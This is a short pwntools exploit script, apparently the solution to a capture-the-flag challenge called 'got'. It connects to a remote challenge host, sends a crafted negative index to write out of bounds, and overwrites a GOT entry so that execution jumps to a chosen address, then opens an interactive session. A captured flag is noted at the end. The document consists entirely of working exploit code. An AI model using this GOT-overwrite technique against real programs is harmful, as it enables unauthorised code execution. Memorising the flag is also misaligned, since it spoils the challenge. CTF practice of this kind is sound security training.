from pwn import *

# context.arch = 'amd64'
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./got', '''
#     b *(main+243)
#     continue
# ''')

p = remote('got-633f0940af5db06d.deploy.phreaks.fr', 443, ssl=True)

p.sendlineafter(b'> ', str(-((0x404080-0x404008)//0x20+1)).encode())
p.sendlineafter(b'> ', b'A'*0x8+p64(0x4012b8))

p.interactive()

# PWNME{G0t_Ov3Rwr1t3_fTW__}